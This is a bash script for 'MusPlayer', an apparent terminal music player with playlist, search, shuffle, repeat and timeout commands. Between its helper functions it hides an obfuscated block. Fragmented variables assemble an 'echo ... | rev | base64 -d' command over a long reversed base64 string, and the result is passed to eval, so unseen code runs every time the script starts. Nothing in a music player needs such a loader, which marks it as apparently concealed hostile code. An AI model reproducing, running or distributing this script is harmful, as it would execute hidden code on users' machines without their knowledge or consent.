#!/bin/bash

# MusPlayer
# Version    : 1.0
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Contact    : https://m.me/KasRoudra
# Description: Terminal music player
# 1st Commit : 31-08-2021
# Credits    : MuxSic(BagazMukti)
# Language   : Shell
# If you copy, consider giving credit! We keep our code open source to help others

: '
MIT License

Copyright (c) 2023 KasRoudra

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'

black="\033[0;30m"
red="\033[0;31m"
green="\033[0;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
white="\033[0;37m"
nc="\033[00m"

script="$0"
version="1.1"


logo="${green} __  __           ____  _
${red}|  \/  |_   _ ___|  _ \| | __ _ _   _  ___ _ __
${blue}| |\/| | | | / __| |_) | |/ _' | | | |/ _ \ '__|
${yellow}| |  | | |_| \__ \  __/| | (_| | |_| |  __/ |
${purple}|_|  |_|\__,_|___/_|   |_|\__,_|\__, |\___|_|
${cyan}                                |___/  [v${version}]
${red}                               [By KasRoudra]${nc}
"


prompt="${cyan}Mus${nc}@${cyan}Player ${red}$ ${nc}"
directory="$HOME/Music"
is_shuffle=false
is_repeat=false
repeat_count=0
timeout_count=0


num='^[0-9]+$'


pacmans=(
  "pkg"
  "apt"
  "apt-get"
  "dnf"
  "yum"
  "zypper"
  "brew"
)

packages=(
  "git"
  "mpv"
  "mediainfo"
)


color=0

info() {
  if (( $color % 2 == 0 )) ; then
    echo -e "${yellow}[${white}*${yellow}] ${cyan}${1}${nc}\n"
  else
    echo -e "${green}[${white}+${green}] ${purple}${1}${nc}\n"
  fi
  (( color++ ))
  sleep 1
}


ask() {
  printf "${yellow}[${white}?${yellow}] ${blue}${1}${green}"
  sleep 1
}

success() {
  echo -e "${cyan}[${white}✔${cyan}] ${green}${1}${nc}\n"
  sleep 1
}

error() {
  echo -e "${blue}[${white}✘${blue}] ${red}${1}\007${nc}\n"
  sleep 1
}

handle_interrupt() {
  success "Thanks for using. Have a good day!"
  exit 0
}

doas() {
  # Check for sudo
  if [ -x "$(command -v sudo)" ]; then
    sudo $@
  else
    eval $@
  fi
}



gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==gIXFlckIzYIRCekEHMORiIgwWY2VmCpICcahHJVRCTkcVUyRie5YFJ3RiZkAnW4RidkIzYIRiYkcHJzRCZkcVUyRyYkcHJyMGSkICIsFmdlhCJ9gnCiISPwpFe7IyckVkI9gHV7ICfgYnI9I2OiUmI9c3OiImI9Y3OiISPxBjT7IiZlJSPjp0OiQWLgISPVtjImlmI9MGOQtjI2ISP6ljV7Iybi0DZ7ISZhJSPmV0Y7IychBnI9U0YrtjIzFmI9Y2OiISPyMGS7Iyci0jS4h0OiIHI8ByJaBzZwA1UKZkWDl0NhBDM3B1UKRTVz8WaPJTT5kUbO9WSqRXTQNVSwkka0lXVWNWOJlWS3o1aVhHUTp0cVNVS3MmewkWSDNWOQdFZKdVRaNXWyQnSlxGbKV1aOxWYwYVSUVVOTFWVs5GZxQmWNxmW0F1MCpUUy4EahVEaLZFbKRkVHRnaWxmV1UVbsxmTWx2RTpmTTFmVwJXUXVDWOZkSwp1R0pUZsxmSV1GbaFmMOl0UuB3URFDcylVMaZVZWpUNXdFdqNVRwVDVVRGVhBDbENFWOdkYXJ1chVkTL90VkVXUywmSVFjQzMWRaxmTwwWNZJDdXFGMrVjWwg2VOBDbEpVbkplYrtWNTRlSQFmVWR3UUxmaNBTOwN1Vxo0TWtmeUJDbKVVMCRTUtBXVOBDbwdVb4tUVxIUcjRkQQFmVGhFVHRmSVFjQXR2RwpkYXhHdTRFbOJFM5IFZHBnSNtGbUVFRaNXYsl1MThFbpFGVCV0VqRmSVFDcvNFbOFlYWl1dXRFZKV2VO9WUtVjSPZVV3dFWKBTYrxmNS1WMK9kVrlHVywmSVFjQ1QVVkRlTwwWNZJza3FGbNBTYEJEUhVFbJNFVoNUZVBHaR5GchRGMFhnVVRXYhFDZFJGRC9UYFpURURlTD1kVWxUVsJ1VlpGaYllVCtkVGFVMhFjVpRleshVVzY0UXZkUSRFbaRFZyQncZRlQzdlRahFVsRGUT1GeYVleOZXTXZ0VhVEaWZFSBdXWxo1TWxWT6R1VxwGZyQHWVBjUPZFM5IlWFpVYSRFbGZFMOtkVsRWWS5GcSV1aKVUWuZ1RNZlW6V1aWFmUrpUWWFDcrJ1axQTTGZVaTBTW6ZlRodkVHZkcV1GdSJVV0gnVu5UYWxmU6FlaOlWYxokcVJjRHZVMKxkYEJkVkhEa0V1V4FmYGp1MSRlRXNmM4h1VVZ1VWdlVZpVRahmUFVzVV5mThFGbWh3YGZFahVkSxVFMW9UTWplcTxmVWR2MkRXWsp0ViZkUMRVb4xWVycGeW5mUzVGbWVlVqJEaltmV0RFWONnVxwmRWxmVsd1RSdUWVJ1TWxmS6NVb1c1YspEWZdFcDFGbkp0YFpFVktmWxZlbsplVXpkVlVEZoJGMwhFVVR2UNZkVZJlbwpWVwoURZ5mVHZFbaB1YEJkVlZlRJplRnhnUxAHRStmWONmeWR3VYxmUiZlTwp1R0Z1VXJ1RWBzc1EWMaRDZ6pkTWpmRIl1a0dnVrFDShRkQXR2RnlXVXh3aiZkS2MFVGhWYzIkVX5mSzZVbWFWTVR2aSVkWHRFWNFjVxY1VOdFdUlVVKFXVrZ1TWxmW2EVbwdVZFZUdaZkWwIlMGxkTXRnTNZkWVZVMsNVTspEVRtmUpVmVvhXWXR3cNxGbzIGMaRVWXd2dZ5GaaJWRxgUTVR2VjJDaIl1VsdUYspkRUpmRXVWRxUnVYR2MidlSTZVb4V1UwUzVUZFZTdlRkFzYEZkVVBjSFllbWdkVspFUjRkQWVmVGlkWGdGeSFDcEJ1aa50Y6ZFWWZVWxEWMOhWUtB3UkBTW4RVV0tWYxoFNRZFaPZFSSh0VrR3dStWMIVlaCZ1VGpEdVZlSDJ1RKFjUsp1VUNjQyZ1MkplUX50UjZEaX5URadEVY50QixmWWNmRWpVYHhmVWRlVr1kVaZHVqJkVStmSJlVMKdlYGJ1dUtGZOl1VoJnVwsWNWBTMYNVbwNFZUZlcV1Gd3JFbwdkVrJFWXdEaHdFbSdkUrFjeX1GcWNGWCZVWXh2QhxmTGRlaGdVYwAnVWhFZzI2VKNlVthXVTNjQHRVVkNVTGZVWV1WMrlVVwFXVzA3RWFjSyR2RxgVZqJlVWxmULVWbGNzVWplTjBjSFZlbONlYWRmcS1GcURGM0gnVtR3SiZkW0E1V1wmYGBnRX1WR4ZlVJhnVWhGWkVlWWR1a1smYGFleSxGZTR1MSJnVzg2MSFDZhpVRaFWUwo1RUhVTxYVMWdlTXRHVZVlSxVlbkdUTVFDaU1GeWR2MNlHVWJVYiZkUwMmRaN1UtJVdW52b0YFMxglUrJVakFjRHlVb0dnUsBnNTZlWUZFRGhUWr50RNxmWMplRoZFZIhGWZdFaTZlVJFjWEZ0ViBDN3ZVVaRjVwUTUaZkWOFGSCdEVVR2UNZkVZVVbxsWWVpURZ52Zw0kRKpXTVZVYWVFcWZVMnhnVwUTSNZlVpJFMaVnVYp0UidlRQJVbwRlUVRDeWpmQGFGbaVzVXRHbiZEcGdVbFhnVWlEeWZFaYN2aJpXVxo0QSdkS1kVMalWZHNXeXVlW3JlVKVlWFpVYRBjWYZ1a5MkYsZ1VTpmRUFmRKNXVWp1aW1WS4lVMWVFZGBnVZFjTwIVMwh3YFplTSFTS3ZlVoNlYXJlcT1GcXRWVahEVVlDNWZFcYNWRaR1VqZFdWVEaLJWRxQ1VtBXVWFjSIllVStkVFlDVjRkRo1URwV3VWR2Qi1mSTpVRalmUWpFWVtGZDdlRkFTZEp0VWdkUyZFWw9UTXZkdjdEdYRWMsZUVsJ1VS1mUY1kVWlGVzIUdW5mSTJmVOh2UsJFURFTS4ZVbwNUYsxWWNVlVsZlbohUWXh2VWFjWMVlaCZ1VGpEdVdFaXJmRSRzVUZEahJDaYZVRadnVVVjVT1GcWJVRahlVu50aixmWWNmRWpVYHhmVWRlVr1kVaZHVqJkVStmS1lFboFmUtZ0TjZkWOJVMKllVzI1aSJjVYNVbwRVZWVEeZdFd0YlVsNDZwQ2UWZkSXZFVSdkUrFjeiZEZWRGSoh1VXB3VhFjTGRFbadVTIJkVW5GZGFWbOV1VthXVVt2b5VFbO9WTWplWjRkQVZFMaVUWuBnRNdlRQNGRCZVZqJlVVFjUvJmRGFjUsplTkBTNZd1aaNlVyY0bXxmVU5Ub3hHVWR2TXZkU6F2Rx8UYXJlVUVlVPJWRwcXVq50VjxmS1VFbOdVTHVkeTxGZTF2MoR3VVp1dSZlSVZ1aat2Uxo1RUhlTXFGbalXVtFDahpnVIllVstmYHZETadEeWVWRGVXWs50VSxGcM1UVWd1Yyg2cWFDaTJmVa9UTXFzUkpmRWZVb0dnVWJVSTtmWqdlaWhUWxcGeWdlSMNFboZFZYhGWZdFb3JlMKpkYGpVahFDcyZFWkNjVyIFUXtmWhJGMZlXWXZ0bWZFZxUlaKdVYWB3cW5GZH1kVap3YFRWYjtmSZplRwtkUHZVRStmWON2MndnVWxGNWJjRwNWRkl2UXh3VZpmQ3ZlVWNDZ6pkaUxmWzZVR0NlVyoUdiRkTXd1RnpXVWp0QSd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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"

install_packages() {
  # Install required packages
  for package in "${packages[@]}"; do
    if ! $(is_installed "$package"); then
        installer "$package"
    fi
  done

  for package in  "${packages[@]}"; do
    if ! $(is_installed "$package"); then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
  done
}

welcome() {
    clear
    if $(is_installed lolcat); then
      echo -e "$logo" | lolcat
    else
      echo -e "$logo"
    fi
}


help() {
  if $is_repeat; then
    repeat_status="On ✔ "
  elif [ $repeat_count -gt 0 ]; then
    repeat_status="On ➤ ${cyan} $repeat_count Times "
  else
    repeat_status="Off ✘ "
  fi
  if [ $timeout_count -gt 0 ]; then
    timeout_ms=$(get_timeout $timeout_count)
    timeout_status="On ➤ ${cyan}${timeout_ms} "
  else
    timeout_status="Off ✘ "
  fi
  if $is_shuffle; then
    shuffle_status="On ✔ "
  else
    shuffle_status="Off ✘ "
  fi
  user_dir=$(swap_dir $directory)
  echo -e "${info}${cyan}List of commands:${yellow}
${cyan}>${purple} help             ${yellow}Shows this help
${cyan}>${purple} list             ${yellow}Shows music list
${cyan}>${purple} search           ${yellow}Search in music list
${cyan}>${purple} chdir${green} <path>     ${yellow}Changes music list directory (current: $blue$user_dir$yellow)
${cyan}>${purple} play${green} <number>    ${yellow}Plays that music
${cyan}>${purple} play all         ${yellow}Plays all music
${cyan}>${purple} repeat${green} <number>  ${yellow}Repeats the music (current: $blue$repeat_status${yellow})
${cyan}>${purple} shuffle          ${yellow}Shuffles all music (current: $blue$shuffle_status$yellow)
${cyan}>${purple} timeout${green} <number> ${yellow}Timeout (current: $blue$timeout_status$yellow)
${cyan}>${purple} about            ${yellow}About this program
${cyan}>${purple} more             ${yellow}More tools from author
${cyan}>${purple} exit             ${yellow}Exit from this program${nc}
"
}

get_list() {
  music_list=()
  mp3list=$(ls $directory | grep mp3)
  replaced=${mp3list// /%%}
  for item in $replaced; do
    music_list+=("$item")
  done
}

get_timeout() {
  timeout_count="$1"
  min=$(expr $timeout_count / 60)
  sec=$(expr $timeout_count % 60)
  if [[ $min -ne 0 ]]; then
    minute=" ${min}m"
  fi
  if [[ $sec -ne 0 ]]; then
    second=" ${sec}s"
  fi
  echo "${minute}${second}"
}

list() {
  get_list
  if [ -n "$music_list" ]; then
    count=${#music_list[@]}
    for index in $(seq $count); do
      item=${music_list[(($index-1))]}
      music=${item//%%/ }
      if (( index % 2 == 0 )) ; then
        echo -e "${yellow}[$index]${blue} ${music}"
      else
        echo -e "${green}[$index]${purple} ${music}"
      fi
    done
  else
     error "No music in $blue$directory!"
  fi
}

search() {
  term="$1"
  found=0
  get_list
  if [ -n "$music_list" ]; then
    count=${#music_list[@]}
    for index in $(seq $count); do
      item=${music_list[(($index-1))]}
      music=${item//%%/ }
      if echo "$music" | grep -iEq "$term"; then
        ((found++))
        if (( index % 2 == 0 )) ; then
          echo -e "${yellow}[$index]${blue} ${music}"
        else
          echo -e "${green}[$index]${purple} ${music}"
        fi
      fi
    done
    if [[ $found -eq 0 ]]; then
      error "No music found for $term"
    else
      echo
      success "$found match(s) found!"
    fi
  else
     error "No music in $blue$directory!"
  fi
}

swap_dir() {
  dir="$1"
  if echo "$dir" | grep -q "~"; then
    swapped=$(echo "$dir" | sed s+~+$HOME+g)
  fi
  if echo "$dir" | grep -q "$HOME"; then
    swapped=$(echo "$dir" | sed s+$HOME+~+g)
  fi
  if [ -n "$swapped" ]; then
    echo "$swapped"
  else
    echo "$dir"
  fi
}

chdir() {
  dir="$1"
  if echo "$dir" | grep -q "~"; then
    sysdir=$(swap_dir "$dir")
  else
    sysdir="$dir"
  fi
  if [ -d "$sysdir" ]; then
    directory="$sysdir"
    success "Directory set to ${cyan}${dir}${green}!"
  else
    error "$sysdir doesn't exist!"
  fi
}

play() {
  index="$1"
  get_list
  count=${#music_list[@]}
  all=false
  if [ -z "$index" ] && $is_shuffle; then
    index=$(shuf -i 1-${count} -n 1)
  elif [[ $index =~ $num ]] && [[ $index -gt 0 &&  $index -le $count ]]; then # Handles normal playing by index
    printf "" 
  elif  [[ "$index" == "" ]] || [[ "$index" == "all" ]] || [[ "$index" == "a" ]]; then # Handles playing all
    index=0
    all=true
  else
    error "Cannot play $index!"
    return
  fi
  while [[ $repeat_count -ge 0 ]] && [[ $timeout_count -ge 0 ]]; do
    trap "break" 2
    if $all; then
      if $is_shuffle; then
        index=$(shuf -i 1-${count} -n 1)
      else
        ((index++))
      fi
    fi
    item=${music_list[(($index-1))]}
    music=${item//%%/ }
    runtime=$(mediainfo "$directory/$music" | grep Duration | head -1 | awk -F ":" '{print $2}')
    min=$(echo "$runtime" | awk '{print $1}')
    sec=$(echo "$runtime" | awk '{print $3}')
    if ! [[ $min =~ $num ]]; then
      min=0
      sec=$(echo "$runtime" | awk '{print $1}')
    fi
    duration=$(expr $min "*" 60 + $sec)
    if [[ $duration -gt $timeout_count ]]; then
      success "Playing ${music}...."
      mpv "$directory/$music"
    fi
    if [[ $timeout_count -ne 0 ]]; then
      timeout_count=$(expr $timeout_count - $duration)
    fi
    if [[ $repeat_count -ne 0 ]]; then
      ((repeat_count--))
    fi
    if ! $all && ! $is_repeat; then
      break
    fi
  done
}


shuffle() {
  if $is_shuffle; then
    is_shuffle=false
    success "Shuffle is turned off!"
  else
    is_shuffle=true
    success "Shuffle is turned on!"
  fi
}

repeat() {
  count="$1"
  if [[ $count =~ $num ]] && [[ $count -ge 0 ]]; then
    repeat_count=$count
    success "Repeat count is set to $repeat_count!"
  elif [ -z "$count" ] || [[ $count -eq 0 ]]; then
    if $is_repeat; then
      is_repeat=false
      success "Repeat is turned off!"
    else
      is_repeat=true
      success "Repeat is turned on!"
    fi
  else
    error "Invalid repeat count $repeat_count!"
  fi
}

timeout() {
  count="$1"
  if [[ $count =~ $num ]] && [[ $count -ge 0 ]]; then
    timeout_count=$count
    timeout_ms=$(get_timeout $timeout_count)
    success "Timeout is set to${timeout_ms}!"
  else
    error "Invalid timeout $timeout_count!"
  fi
}

reset(){
  [ $is_termux ] && directory="/sdcard/Music"  || directory="$HOME/Music"
  is_repeat=false
  is_shuffle=false
  timeout_count=0
  repeat_count=0
}


more() {
  xdg-open https://github.com/KasRoudra/KasRoudra#My-Best-Works &> /dev/null &
}


about() {
  welcome
  echo -e "$red[ToolName]  ${cyan}  :[MusPlayer]
$red[Version]    ${cyan} :[1.0]
$red[Description]${cyan} :[Terminal Music Player]
$red[Author]     ${cyan} :[KasRoudra]
$red[Github]     ${cyan} :[https://github.com/KasRoudra] 
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
}

menu() {
  while true; do
    trap "break" 2
    printf "$prompt"
    read input
    echo
    cmd=$(echo "$input" | cut -d " " -f1)
    arg=$(echo "$input" | cut -d " " -f2)
    case "$cmd" in 
      ls|list)
        list "$arg"
        ;;
      sr|search)
        search "$arg"
        ;;
      p|play)
        play "$arg"
        ;;
      cd|chdir)
        chdir "$arg"
        ;;
      s|shuffle)
        shuffle "$arg"
        ;;
      r|repeat)
        repeat "$arg"
        ;;
      t|timeout)
        timeout "$arg"
        ;;
      rs|reset)
        reset
        ;;
      clr|clear)
        welcome
        ;;
      m|more)
        more
        ;;
      a|about)
        about
        ;;
      h|help)
        help "$arg"
        ;;
      q|x|exit)
        handle_interrupt
        ;;
      *)
        error "Invalid input '$input'!"
        ;;
    esac
  done
}

end() {
  info "GoodBye!"
}

usage() {
  code="$1"
  head="$green"
  header="$cyan"
  body="$yellow"
  USAGE="${head}USAGE:
   ${header}./${script} [options]
  
${head}OPTIONS:

   ${header}-l, --list                 ${body}Shows a list of music in directory
   ${header}-sr TERM, --search TERM    ${body}Search in music list
   ${header}-p INDEX, --play INDEX     ${body}Play music by index
   ${header}-d DIRECTORY, --dir DIRECTORY
   ${header}                           ${body}Set music directory
   ${header}-s, --shuffle              ${body}Enable shuffle
   ${header}-r NUMBER, --repeat NUMBER
   ${header}                           ${body}Enable repeat for n times
   ${header}-t TIMEOUT, --timeout TIMEOUT
   ${header}                           ${body}Close playing after n seconds
   ${header}-a, --about                ${body}Shows tool information
   ${header}-m, --more                 ${body}A link to githun for more script
   ${header}-h, --help                 ${body}Shows this help
   ${header}-v, --version              ${body}Shows script version

    
${head}EXAMPLE:
   ${header}./${script} -v"
   
  ALL="${head}NAME:
   ${header}MusPlayer
  
${head}DESCIPTION:
   ${header}Terminal music player
  
$USAGE
   
${head}COPYRIGHT:
   ${header}KasRoudra (2023)

${head}LICENSE:
   ${header}MIT

${head}VERSION:
   ${header}${version}
"
  if [ $code -eq 0 ]; then
    echo -e "$ALL"
  else 
    echo -e "$USAGE"
  fi
}

main() {
    
  cwd=$(pwd)
  
  # Termux
  if echo "$HOME" | grep -q "termux"; then
    is_termux=true
    directory="/sdcard/Music"
    touch "$directory/.temp" || termux-setup-storage
    rm "$directory/.temp" || termux-setup-storage
  else
    is_termux=false
  fi
  
  if ! [ -d "$directory" ]; then 
    mkdir -p "$directory"
  fi

  # Prevent ^C
  stty -echoctl

  # Detect UserInterrupt
  trap "handle_interrupt" 2
  
  install_packages
  
  while [ "$#" -gt 0 ]; do
    case $1 in
      -l|--list)
        list
        exit 0
        ;;
      -sr|search)
        search $2
        exit 0
        ;;
      -d|--directory)
        chdir $2
        shift
        ;;
       -p|--play)
        play $2
        [ -n $3 ] && shift || exit 0
        ;;
      -h|--help)
        usage 0
        exit 0
        ;;
      -s|--shuffle)
        shuffle
        ;;
      -r|--repeat)
        repeat $2
        shift
        ;;
      -t|--timeout)
        timeout $2
        shift
        ;;
      -a|--about)
        about 
        exit 0
        ;;
      -m|--more)
        more 
        exit 0
        ;;
      -v|--version)
        info "${cyan}Version: ${green}${version}"
        exit 0
        ;;
      *)
        error "Unknown option $1!"
        usage 1
        exit 1
        ;;
        esac
    shift
  done
  welcome
  menu
  end
}

main $@